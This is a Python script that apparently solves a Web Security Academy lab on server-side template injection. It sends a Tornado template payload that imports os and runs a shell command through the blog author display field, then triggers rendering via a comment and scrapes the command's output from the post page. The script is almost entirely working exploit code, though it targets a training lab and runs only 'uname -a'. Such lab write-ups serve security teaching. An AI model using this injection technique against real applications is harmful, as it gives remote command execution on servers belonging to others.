# Lab: Basic server-side template injection (code context)
# difficulty: practitioner

import requests
import re

sub = '0ab4005b0341a91080b57197007400bf'
url = f'https://{sub}.web-security-academy.net'

def main():
    headers = {
        'Cookie': 'session=Zl7oHjhvKK7gMglwC42LwjizhYjljKVo'
    }

    payload = '}}{% import os %}{{os.system("uname -a")' # https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python
    body = {
        'csrf': '6viXXo0Q1P5a261aVXfNs6bITMY6uRom',
        'blog-post-author-display': 'user.first_name' + payload
    }

    endpoint = '/my-account/change-blog-post-author-display'
    r = requests.post(url + endpoint, headers=headers, data=body)

    body = {
        'csrf': '6viXXo0Q1P5a261aVXfNs6bITMY6uRom',
        'postId': 2,
        'comment': 'cawk'
    }
    endpoint = '/post/comment'
    r = requests.post(url + endpoint, headers=headers, data=body)
    
    endpoint = '/post?postId=2'
    r = requests.get(url + endpoint)

    pattern = re.compile(r'<p>\s*<img src="/resources/images/avatarDefault.svg" class="avatar">(.*?)</p>', re.DOTALL)
    match = pattern.findall(r.text)
    print(match[5].strip())

if __name__ == '__main__':
    main()